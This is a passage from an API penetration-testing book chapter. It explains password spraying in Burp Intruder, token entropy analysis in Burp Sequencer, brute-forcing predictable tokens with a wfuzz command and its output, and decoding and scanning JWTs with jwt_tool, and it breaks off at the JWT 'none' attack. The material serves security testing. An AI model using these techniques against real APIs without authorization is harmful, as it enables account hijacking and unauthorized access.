encoded. You can decode them by highlighting the payload, right-clicking, and selecting </span><span class="c8">Base64-decode</span><span class="c1 c12">&nbsp;(or the shortcut CTRL-SHIFT-B). This will reveal the payload so that you can see how it is formatted.</span></p><p class="c7"><span class="c1">To perform, say, a password-spraying attack using base64 encoding, begin by selecting the attack positions. In this case, we&rsquo;ll select the base64-encoded password from the request in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-5&amp;sa=D&amp;source=editors&amp;ust=1681144468700136&amp;usg=AOvVaw3g0PlFt3iBDDpntAKAeLaB">Figure 8-5</a></span><span class="c1 c12">. Next, add the payload set; we&rsquo;ll use the passwords listed in the previous section.</span></p><p class="c7"><span class="c1">Now, in order to encode each password before it is sent in a request, we must use a payload-processing rule. Under the Payloads tab is an option to add such a rule. Select </span><span class="c8">Add</span><span class="c32">&#9654;</span><span class="c8">Encoded</span><span class="c32">&#9654;</span><span class="c8">Base64-encode</span><span class="c1">&nbsp;and then click </span><span class="c8">OK</span><span class="c1">. Your payload-processing window should look like </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-6&amp;sa=D&amp;source=editors&amp;ust=1681144468700982&amp;usg=AOvVaw1opJI2A0gtJ0MxQ1K30lsF">Figure 8-6</a></span><span class="c1 c12">.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 400.00px;"><img alt="Screenshot of an HTTP request in Burp Suite with a value highlighted and right-clicked, and &ldquo;Convert selection, Base64, Base64-decode&rdquo; selected in the menu" src="images/image1.png" style="width: 624.00px; height: 400.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-5</span><span class="c10">: Decoding base64 using Burp Suite Intruder</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 553.33px;"><img alt="Screenshot of Burp Suite&rsquo;s &ldquo;Add Payload Processing Rule&rdquo; menu. &ldquo;Encode&rdquo; and &ldquo;Base64-encode&rdquo; are selected in the drop-down menus." src="images/image8.png" style="width: 624.00px; height: 553.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-6</span><span class="c10">: Adding a payload-processing rule to Burp Suite Intruder</span></p><p class="c7"><span class="c1 c12">Now your base64-encoded password-spraying attack is ready to launch.</span></p><h2 class="c19 c26" id="h.xiuos67w6py1"><span class="c16 c12">Forging Tokens</span></h2><p class="c23 c19"><span class="c1 c12">When implemented correctly, tokens can be an excellent way for APIs to authenticate users and authorize them to access their resources. However, if anything goes wrong when generating, processing, or handling tokens, they&rsquo;ll become our keys to the kingdom.</span></p><p class="c7"><span class="c1 c12">The problem with tokens is that they can be stolen, leaked, and forged. We&rsquo;ve already covered how to steal and find leaked tokens in Chapter 6. In this section, I&rsquo;ll guide you through the process of forging your own tokens when weaknesses are present in the token generation process. This requires first analyzing how predictable an API provider&rsquo;s token generation process is. If we can discover any patterns in the tokens being provided, we may be able to forge our own or hijack another user&rsquo;s tokens.</span></p><p class="c7"><span class="c1 c12">APIs will often use tokens as an authorization method. A consumer may have to initially authenticate using a username and password combination, but then the provider will generate a token and give that token to the consumer to use with their API requests. If the token generation process is flawed, we will be able to analyze the tokens, hijack other user tokens, and then use them to access the resources and additional API functionality of the affected users.</span></p><p class="c7"><span class="c1 c12">Burp Suite&rsquo;s Sequencer provides two methods for token analysis: manually analyzing tokens provided in a text file and performing a live capture to automatically generate tokens. I will guide you through both processes.</span></p><h3 class="c26 c19" id="h.udupqd7no3e4"><span class="c15 c12">Manual Load Analysis</span></h3><p class="c19 c23"><span class="c1">To perform a manual load analysis, select the </span><span class="c8">Sequencer</span><span class="c1">&nbsp;module and choose the </span><span class="c8">Manual Load</span><span class="c1">&nbsp;tab. Click </span><span class="c8">Load</span><span class="c1">&nbsp;and provide the list of tokens you want to analyze. The more tokens you have in your sample, the better the results will be. Sequencer requires a minimum of 100 tokens to perform a basic analysis, which includes a </span><span class="c1 c14">bit-level</span><span class="c1 c12">&nbsp;analysis, or an automated analysis of the token converted to sets of bits. These sets of bits are then put through a series of tests involving compression, correlation, and spectral testing, as well as four tests based on the Federal Information Processing Standard (FIPS) 140-2 security requirements.</span></p><h2 class="c25" id="h.hrrc1ni3168f"><span class="c37 c12">NOTE</span></h2><p class="c23"><span class="c1 c13">If you would like to follow along with the examples in this section, generate your own tokens or use the bad tokens hosted on the Hacking-APIs GitHub repo (</span><span class="c21 c13"><a class="c24" href="https://www.google.com/url?q=https://github.com/hAPI-hacker/Hacking-APIs&amp;sa=D&amp;source=editors&amp;ust=1681144468705677&amp;usg=AOvVaw00XkkrM_yFJ4fhw-HBy7bq">https://github.com/hAPI-hacker/Hacking-APIs</a></span><span class="c1 c27 c13">).</span></p><p class="c7"><span class="c1">A full analysis will also include </span><span class="c1 c14">character-level</span><span class="c1 c12">&nbsp;analysis, a series of tests performed on each character in the given position in the original form of the tokens. The tokens are then put through a character count analysis and a character transition analysis, two tests that analyze how characters are distributed within a token and the differences between tokens. To perform a full analysis, Sequencer could require thousands of tokens, depending on the size and complexity of each individual token.</span></p><p class="c7"><span class="c1">Once your tokens are loaded, you should see the total number of tokens loaded, the shortest token, and the longest token, as shown in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-7&amp;sa=D&amp;source=editors&amp;ust=1681144468707110&amp;usg=AOvVaw0pFFus2K846gdjeLpzq_qt">Figure 8-7</a></span><span class="c1 c12">.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 301.33px;"><img alt="Screenshot of Burp Suite Sequencer with token values loaded to the Manual Load field." src="images/image10.png" style="width: 624.00px; height: 301.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c13 c30">Figure 8-7</span><span class="c10">: Manually loaded tokens in Burp Suite Sequencer</span></p><p class="c7"><span class="c1">Now you can begin the analysis by clicking </span><span class="c8">Analyze Now</span><span class="c1">. Burp Suite should then generate a report (see </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-8&amp;sa=D&amp;source=editors&amp;ust=1681144468708418&amp;usg=AOvVaw1GyxWSGwZNohXI5Zuubwyi">Figure 8-8</a></span><span class="c1 c12">).</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 158.67px;"><img alt="Screenshot of the Burp Suite Sequencer Summary tab with &ldquo;Overall result&rdquo; and &ldquo;Effective Entropy&rdquo; sections describing the results of the analysis" src="images/image15.png" style="width: 624.00px; height: 158.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-8</span><span class="c10">: The Summary tab of the token analysis report provided by Sequencer</span></p><p class="c7"><span class="c1">The token analysis report begins with a summary of the findings. The overall results include the quality of randomness within the token sample. In </span><span class="c14 c21"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-8&amp;sa=D&amp;source=editors&amp;ust=1681144468709612&amp;usg=AOvVaw2vBCH6qOVHH9YkjUZI_b7A">Figure 8-8</a></span><span class="c1 c12">, you can see that the quality of randomness was extremely poor, indicating that we&rsquo;ll likely be able to brute-force other existing tokens.</span></p><p class="c7"><span class="c1">To minimize the effort required to brute-force tokens, we&rsquo;ll want to determine if there are parts of the token that do not change and other parts that often change. Use the character position analysis to determine which characters should be brute-forced (see </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-9&amp;sa=D&amp;source=editors&amp;ust=1681144468710318&amp;usg=AOvVaw24HUT5aRcaGfKQ3_jIvJZi">Figure 8-9</a></span><span class="c1">). You can find this feature under Character Set</span><span class="c8">&nbsp;</span><span class="c1 c12">within the Character-Level Analysis tab.</span></p><p class="c7"><span class="c1">As you can see, the token character positions do not change all that much, with the exception of the final three characters; the string </span><span class="c29">Ab4dt0k3n</span><span class="c1 c12">&nbsp;remains the same throughout the sampling. Now we know we should perform a brute force of only the final three characters and leave the remainder of the token untouched.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 358.67px;"><img alt="Screenshot of the Burp Suite Sequencer &ldquo;Character Set&rdquo; menu. Shows a chart of the size of the character set used in each position. Most positions have a character set smaller than 5, but the 10th position has more than 25 characters in its character set." src="images/image6.png" style="width: 624.00px; height: 358.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-9</span><span class="c10">: The character position chart found within Sequencer&rsquo;s character-level analysis</span></p><h3 class="c26 c19" id="h.tmpo7isrnz8v"><span class="c15 c12">Live Token Capture Analysis</span></h3><p class="c23 c19"><span class="c1 c12">Burp Suite&rsquo;s Sequencer can automatically ask an API provider to generate 20,000 tokens for analysis. To do this, we simply intercept the provider&rsquo;s token generation process and then configure Sequencer. Burp Suite will repeat the token generation process up to 20,000 times to analyze the tokens for similarities.</span></p><p class="c7"><span class="c1">In Burp Suite, intercept the request that initiates the token generation process. Select </span><span class="c8">Action </span><span class="c1">(or right-click the request) and then forward it to Sequencer. Within Sequencer, make sure you have the live capture tab selected, and under </span><span class="c8">Token Location Within Response</span><span class="c1">, select the </span><span class="c8">Configure for the Custom Location</span><span class="c1">&nbsp;option. As shown in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-10&amp;sa=D&amp;source=editors&amp;ust=1681144468712206&amp;usg=AOvVaw39dxkikxCYqPRnZceeXiXy">Figure 8-10</a></span><span class="c1">, highlight the generated token and click </span><span class="c8">OK</span><span class="c1 c12">.</span></p><p class="c7"><span class="c1">Select </span><span class="c8">Start Live Capture</span><span class="c1 c12">. Burp Sequencer will now begin capturing tokens for analysis. If you select the Auto analyze checkbox, Sequencer will show the effective entropy results at different milestones.</span></p><p class="c7"><span class="c1 c12">In addition to performing an entropy analysis, Burp Suite will provide you with a large collection of tokens, which could be useful for evading security controls (a topic we explore in Chapter 13). If an API doesn&rsquo;t invalidate the tokens once new ones are created and the security controls use tokens as the method of identity, you now have up to 20,000 identities to help you avoid detection.</span></p><p class="c7"><span class="c1 c12">If there are token character positions with low entropy, you can attempt a brute-force attack against those character positions. Reviewing tokens with low entropy could reveal certain patterns you could take advantage of. For example, if you noticed that characters in certain positions only contained lowercase letters, or a certain range of numbers, you&rsquo;ll be able to enhance your brute-force attacks by minimizing the number of request attempts.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 602.67px; height: 482.67px;"><img alt="Screenshot of Burp Suite Sequencer&rsquo;s &ldquo;Define custom token location&rdquo; menu. &ldquo;Define start and end&rdquo; is checked, an expression is set for both the &ldquo;Start after expression&rdquo; and &ldquo;End at delimiter&rdquo; fields, and a token value is shown highlighted in an HTTP response." src="images/image14.png" style="width: 602.67px; height: 482.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-10</span><span class="c10">: The API provider&rsquo;s token response selected for analysis</span></p><h3 class="c26 c19" id="h.katdc0bag2yb"><span class="c12 c15">Brute-Forcing Predictable Tokens</span></h3><p class="c23 c19"><span class="c1 c12">Let&rsquo;s return to the bad tokens discovered during manual load analysis (whose final three characters are the only ones that change) and brute-force possible letter and number combinations to find other valid tokens. Once we&rsquo;ve discovered valid tokens, we can test our access to the API and find out what we&rsquo;re authorized to do.</span></p><p class="c7"><span class="c1">When you&rsquo;re brute-forcing through combinations of numbers and letters, it is best to minimize the number of variables. The character-level analysis has already informed us that the first nine characters of the token </span><span class="c29">Ab4dt0k3n</span><span class="c1">&nbsp;remain static. The final three characters are the variables, and based on the sample, we can see that they follow a pattern of </span><span class="c1 c14">letter1</span><span class="c1">&nbsp;+ </span><span class="c1 c14">letter2</span><span class="c1">&nbsp;+ </span><span class="c1 c14">number</span><span class="c1">. Moreover, a sample of the tokens tells us that that </span><span class="c1 c14">letter1</span><span class="c1">&nbsp;only ever consists of letters between </span><span class="c1 c14">a</span><span class="c1">&nbsp;and </span><span class="c1 c14">d</span><span class="c1 c12">. Observations like this will help minimize the total amount of brute force required.</span></p><p class="c7"><span class="c1">Use Burp Suite Intruder or Wfuzz to brute-force the weak token. In Burp Suite, capture a request to an API endpoint that requires a token. In </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-11&amp;sa=D&amp;source=editors&amp;ust=1681144468714426&amp;usg=AOvVaw3Q7NFxLDcalqYYUWtXiEdh">Figure 8-11</a></span><span class="c1">, we use a GET request to the </span><span class="c1 c14">/identity/api/v2/user/dashboard</span><span class="c1 c12">&nbsp;endpoint and include the token as a header. Send the captured request to Intruder, and under the Intruder Payload Positions tab, select the attack positions.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 426.67px; height: 270.67px;"><img alt="The Burp Suite Payload Positions menu, with the attack type set to &ldquo;Cluster bomb&rdquo; and the last three characters of the token each set to a payload position" src="images/image2.png" style="width: 426.67px; height: 270.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-11</span><span class="c10">: A cluster bomb attack in Burp Suite Intruder</span></p><p class="c7"><span class="c1">Since we&rsquo;re brute-forcing the final three characters only, create three attack positions: one for the third character from the end, one for the second character from the end, and one for the final character. Update the attack type to </span><span class="c8">cluster bomb</span><span class="c1">&nbsp;so Intruder will iterate through each possible combination. Next, configure the payloads, as shown in </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-12&amp;sa=D&amp;source=editors&amp;ust=1681144468715417&amp;usg=AOvVaw2rdkRFddyxmCX8EGSGAddr">Figure 8-12</a></span><span class="c1 c12">.</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 298.67px;"><img alt="Screenshot of the Burp Suite Payloads tab with &ldquo;Payload set&rdquo; set to &ldquo;1,&rdquo; &ldquo;Payload type&rdquo; set to &ldquo;Brute forcer,&rdquo; &ldquo;Character set&rdquo; set to &ldquo;abcd,&rdquo; and the &ldquo;Min length&rdquo; and &ldquo;Max length&rdquo; fields both set to &ldquo;1&rdquo;" src="images/image3.png" style="width: 624.00px; height: 298.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-12</span><span class="c10">: The payloads tab in Burp Suite&rsquo;s Intruder</span></p><p class="c7"><span class="c1">Select the </span><span class="c8">Payload Set</span><span class="c1">&nbsp;number, which represents a specific attack position, and set the payload type to </span><span class="c8">brute forcer</span><span class="c1">. In the character set field, include all numbers and letters to be tested in that position. Because the first two payloads are letters, we&rsquo;ll want to try all letters from </span><span class="c1 c14">a</span><span class="c1">&nbsp;to </span><span class="c1 c14">d</span><span class="c1">. For payload set 3, the character set should include the digits 0 through 9. Set both the minimum and maximum length to </span><span class="c8">1</span><span class="c1 c12">, as each attack position is one character long. Start the attack, and Burp Suite will send all 160 token possibilities in requests to the endpoint.</span></p><p class="c7"><span class="c1 c12">Burp Suite CE throttles Intruder requests. As a faster, free alternative, you may want to use Wfuzz, like so:</span></p><p class="c9"><span class="c31">$ </span><span class="c20">wfuzz -u vulnexample.com/api/v2/user/dashboard &ndash;hc 404 -H &quot;token: Ab4dt0k3nFUZZFUZ2ZFUZ3Z1&quot; -z list,a-b-c-d -z list,a-b-c-d -z range,0-9</span></p><p class="c9"><span class="c3">============================================================================</span></p><p class="c9"><span class="c3">ID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Response &nbsp; Lines &nbsp; &nbsp;Word &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Chars &nbsp; &nbsp; &nbsp; Payload</span></p><p class="c9"><span class="c3">============================================================================</span></p><p class="c9"><span class="c3">000000117: &nbsp; 200 &nbsp; &nbsp; &nbsp; &nbsp;1 L &nbsp; &nbsp; &nbsp;10 W &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;345 Ch &nbsp; &nbsp; &nbsp;&quot; Ab4dt0k3nca1&quot;</span></p><p class="c9"><span class="c3">000000118: &nbsp; 200 &nbsp; &nbsp; &nbsp; &nbsp;1 L &nbsp; &nbsp; &nbsp;10 W &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;345 Ch &nbsp; &nbsp; &nbsp;&quot; Ab4dt0k3ncb2&quot;</span></p><p class="c9"><span class="c3">000000119: &nbsp; 200 &nbsp; &nbsp; &nbsp; &nbsp;1 L &nbsp; &nbsp; &nbsp;10 W &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;345 Ch &nbsp; &nbsp; &nbsp;&quot; Ab4dt0k3ncc3&quot;</span></p><p class="c9"><span class="c3">000000120: &nbsp; 200 &nbsp; &nbsp; &nbsp; &nbsp;1 L &nbsp; &nbsp; &nbsp;10 W &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;345 Ch &nbsp; &nbsp; &nbsp;&quot; Ab4dt0k3ncd4&quot;</span></p><p class="c17"><span class="c3">000000121: &nbsp; 200 &nbsp; &nbsp; &nbsp; &nbsp;1 L &nbsp; &nbsp; &nbsp;10 W &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;345 Ch &nbsp; &nbsp; &nbsp;&quot; Ab4dt0k3nce5&quot;</span></p><p class="c7"><span class="c1">Include a header token in your request using </span><span class="c29">-H</span><span class="c1">. To specify three payload positions, label the first as </span><span class="c29">FUZZ</span><span class="c1">, the second as </span><span class="c29">FUZ2Z</span><span class="c1">, and the third as </span><span class="c29">FUZ3Z</span><span class="c1">. Following </span><span class="c29">-z</span><span class="c1">, list the payloads. We use </span><span class="c29">-z list,a-b-c-d</span><span class="c1">&nbsp;to cycle through the letters </span><span class="c1 c14">a</span><span class="c1">&nbsp;to </span><span class="c1 c14">d</span><span class="c1">&nbsp;for the first two payload positions, and we use </span><span class="c29">-z range,0-9</span><span class="c1 c12">&nbsp;to cycle through the numbers in the final payload position.</span></p><p class="c7"><span class="c1 c12">Armed with a list of valid tokens, leverage them in API requests to find out more about what privileges they have. If you have a collection of requests in Postman, try simply updating the token variable to a captured one and use the Postman Runner to quickly test all the requests in the collection. That should give you a fairly good idea of a given token&rsquo;s capabilities.</span></p><h2 class="c26 c19" id="h.2canysrx92sm"><span class="c16 c12">JSON Web Token Abuse</span></h2><p class="c23 c19"><span class="c1 c12">I introduced JSON Web Tokens (JWTs) in Chapter 2. They&rsquo;re one of the more prevalent API token types because they operate across a wide variety of programming languages, including Python, Java, Node.js, and Ruby. While the tactics described in the last section could work against JWTs as well, these tokens can be vulnerable to several additional attacks. This section will guide you through a few attacks you can use to test and break poorly implemented JWTs. These attacks could grant you basic unauthorized access or even administrative access to an API.</span></p><h2 class="c25" id="h.w0bmy0li0q8"><span class="c12 c37">NOTE</span></h2><p class="c23"><span class="c1 c13">For testing purposes, you might want to generate your own JWTs. Use </span><span class="c21 c13"><a class="c24" href="https://www.google.com/url?q=https://jwt.io/&amp;sa=D&amp;source=editors&amp;ust=1681144468719227&amp;usg=AOvVaw3EcdrOARhRG_MyZb6Jt5gB">https://jwt.io</a></span><span class="c1 c13 c27">, a site created by Auth0, to do so. Sometimes the JWTs have been configured so improperly that the API will accept any JWT.</span></p><p class="c7"><span class="c1 c12">If you&rsquo;ve captured another user&rsquo;s JWT, you can try sending it to the provider and pass it off as your own. There is a chance that the token is still valid and you can gain access to the API as the user specified in the payload. More commonly, though, you&rsquo;ll register with an API and the provider will respond with a JWT. Once you have been issued a JWT, you will need to include it in all subsequent requests. If you are using a browser, this process will happen automatically.</span></p><h3 class="c26 c19" id="h.a98z247xl9bd"><span class="c15 c12">Recognizing and Analyzing JWTs</span></h3><p class="c23 c19"><span class="c1">You should be able to distinguish JWTs from other tokens because they consist of three parts separated by periods: the header, payload, and signature. As you can see in the following JWT, the header and payload will normally begin with </span><span class="c29">ey</span><span class="c1 c12">:</span></p><p class="c17"><span class="c3">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJoYWNrYXBpcy5pbyIsImV4cCI6IDE1ODM2Mzc0ODgsInVzZXJuYW1lIjoiU2N1dHRsZXBoMXNoIiwic3VwZXJhZG1pbiI6dHJ1ZX0.1c514f4967142c27e4e57b612a7872003fa6cbc7257b3b74da17a8b4dc1d2ab9</span></p><p class="c7"><span class="c1">The first step to attacking a JWT is to decode and analyze it. If you discovered exposed JWTs during reconnaissance, stick them into a decoder tool to see if the JWT payload contains any useful information, such as username and user ID. You might also get lucky and obtain a JWT that contains username and password combinations. In Burp Suite&rsquo;s Decoder, paste the JWT into the top window, select </span><span class="c8">Decode As</span><span class="c1">, and choose the </span><span class="c8">Base64</span><span class="c1">&nbsp;option (see </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c08.xhtml%23figure8-13&amp;sa=D&amp;source=editors&amp;ust=1681144468720667&amp;usg=AOvVaw0f6cL6YgNCFCho1QGSrhcZ">Figure 8-13</a></span><span class="c1 c12">).</span></p><p class="c22"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 268.00px;"><img alt="Screenshot of the Burp Suite Decoder with a long string decoded to a series of header fields" src="images/image12.png" style="width: 624.00px; height: 268.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c30 c13">Figure 8-13</span><span class="c10">: Using Burp Suite Decoder to decode a JWT</span></p><p class="c7"><span class="c1">The</span><span class="c1 c14">&nbsp;header</span><span class="c1 c12">&nbsp;is a base64-encoded value that includes information about the type of token and hashing algorithm used for signing. A decoded header will look like the following:</span></p><p class="c9"><span class="c3">{</span></p><p class="c9"><span class="c3">&quot;alg&quot;: &quot;HS256&quot;</span></p><p class="c9"><span class="c3">&quot;typ&quot;: &quot;JWT&quot;</span></p><p class="c17"><span class="c3">}</span></p><p class="c7"><span class="c1">In this example, the hashing algorithm is HMAC using SHA256. HMAC is primarily used to provide integrity checks similar to digital signatures. SHA256 is a hashing encryption with function developed by the NSA and released in 2001. Another common hashing algorithm you might see is RS256, or RSA using SHA256, an asymmetric hashing algorithm. For additional information, check out the Microsoft API documentation on cryptography at </span><span class="c21 c14"><a class="c24" href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography&amp;sa=D&amp;source=editors&amp;ust=1681144468722376&amp;usg=AOvVaw0nCO36PQP5k7RL_HJwI8FA">https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography</a></span><span class="c1 c12">.</span></p><p class="c7"><span class="c1 c12">When a JWT uses a symmetric key system, both the consumer and provider will need to have a single key. When a JWT uses an asymmetric key system, the provider and consumer will use two different keys. Understanding the difference between symmetric and asymmetric encryption will give you a boost when performing a JWT algorithm bypass attack, found later in this chapter.</span></p><p class="c7"><span class="c1">If the algorithm value is </span><span class="c29">&quot;none&quot;</span><span class="c1 c12">, the token has not been signed with any hashing algorithm. We will return to how we can take advantage of JWTs without a hashing algorithm later in this chapter.</span></p><p class="c7"><span class="c1">The </span><span class="c1 c14">payload</span><span class="c8">&nbsp;</span><span class="c1 c12">is the data included within the token. The fields within the payload differ per API but typically contain information used for authorization, such as a username, user ID, password, email address, date of token creation (often called IAT), and privilege level. A decoded payload should look like the following:</span></p><p class="c9"><span class="c3">{</span></p><p class="c9"><span class="c3">&nbsp; &quot;userID&quot;: &quot;1234567890&quot;,</span></p><p class="c9"><span class="c3">&nbsp; &quot;name&quot;: &quot;hAPI Hacker&quot;,</span></p><p class="c9"><span class="c3">&nbsp; &quot;iat&quot;: 1516239022</span></p><p class="c17"><span class="c3">}</span></p><p class="c7"><span class="c1">Finally,</span><span class="c8">&nbsp;</span><span class="c1">the</span><span class="c8">&nbsp;</span><span class="c1 c14">signature </span><span class="c1 c12">is the output of HMAC used for token validation and generated with the algorithm specified in the header. To create the signature, the API base64-encodes the header and payload and then applies the hashing algorithm and a secret. The secret can be in the form of a password or a secret string, such as a 256-bit key. Without knowledge of the secret, the payload of the JWT will remain encoded.</span></p><p class="c7"><span class="c1 c12">A signature using HS256 will look like the following:</span></p><p class="c9"><span class="c3">HMACSHA256(</span></p><p class="c9"><span class="c3">&nbsp; base64UrlEncode(header) + &quot;.&quot; +</span></p><p class="c9"><span class="c3">&nbsp; base64UrlEncode(payload),</span></p><p class="c17"><span class="c3">&nbsp; thebest1)</span></p><p class="c7"><span class="c1 c12">To help you analyze JWTs, leverage the JSON Web Token Toolkit by using the following command:</span></p><p class="c9"><span class="c31">$ </span><span class="c20">jwt_tool eyghbocibiJIUZZINIISIRSCCI6IkpXUCJ9.eyIzdW1101IxMjMENTY3ODkwIiwibmFtZSI6ImhBuEkgSGFja2VyIiwiaWFQIjoxNTE2MjM5MDIyfQ.IX-Iz_e1CrPrkel FjArExaZpp3Y2tfawJUFQaNdftFw</span></p><p class="c9"><span class="c3">Original JWT:</span></p><p class="c9"><span class="c3">Decoded Token Values:</span></p><p class="c9"><span class="c3">Token header values:</span></p><p class="c9"><span class="c3">[+] alg - &quot;HS256&quot;</span></p><p class="c9"><span class="c3">[+] typ - &quot;JWT&quot;</span></p><p class="c9"><span class="c3">Token payload values:</span></p><p class="c9"><span class="c3">[+] sub = &quot;1234567890&quot;</span></p><p class="c9"><span class="c3">[+] name - &quot;HAPI Hacker&quot;</span></p><p class="c9"><span class="c3">[+] iat - 1516239022 = TIMESTAMP - 2021-01-17 17:30:22 (UTC)</span></p><p class="c9"><span class="c3">JWT common timestamps:</span></p><p class="c9"><span class="c3">iat - Issuedat</span></p><p class="c9"><span class="c3">exp &ndash; Expires</span></p><p class="c17"><span class="c3">nbf - NotBefore</span></p><p class="c7"><span class="c1">As you can see, </span><span class="c29">jwt_tool</span><span class="c1 c12">&nbsp;makes the header and payload values nice and clear.</span></p><p class="c7"><span class="c1">Additionally, </span><span class="c29">jwt_tool</span><span class="c1 c12">&nbsp;has a &ldquo;Playbook Scan&rdquo; that can be used to target a web application and scan for common JWT vulnerabilities. You can run this scan by using the following:</span></p><p class="c17"><span class="c31">$ </span><span class="c20 c12">jwt_tool -t http://target-site.com/ -rc &quot;Header: JWT_Token&quot; -M pb</span></p><p class="c7"><span class="c1">To use this command, you&rsquo;ll need to know what you should expect as the JWT header. When you have this information, replace </span><span class="c29">&quot;Header&quot;</span><span class="c1 c14">&nbsp;</span><span class="c1">with the name of the header and </span><span class="c29">&quot;JWT_Token&quot;</span><span class="c1 c12">&nbsp;with the actual token value.</span></p><h3 class="c26 c19" id="h.hxoi8x8x4x6h"><span class="c15 c12">The None Attack</span></h3><p class="c23 c19"><span class="c1">If you ever come across a JWT using </span><span class="c29">&quot;none&quot;</span><span class="c1 c12">&nbsp;as its algorithm, you&rsquo;ve found an easy win. After decoding the token, you should be able to clearly see the header, payload, and signature. From here, you can alter the information contained in the payload to be whatever you&rsquo;d like. For example, you could change the username to something likely used by the provider&rsquo;s admin account (like root, admin, administrator, test, or adm), as shown here:</span></p><p class="c9"><span class="c3">{</span></p><p class="c9"><span class="c3">&nbsp; &nbsp;&quot;username&quot;: 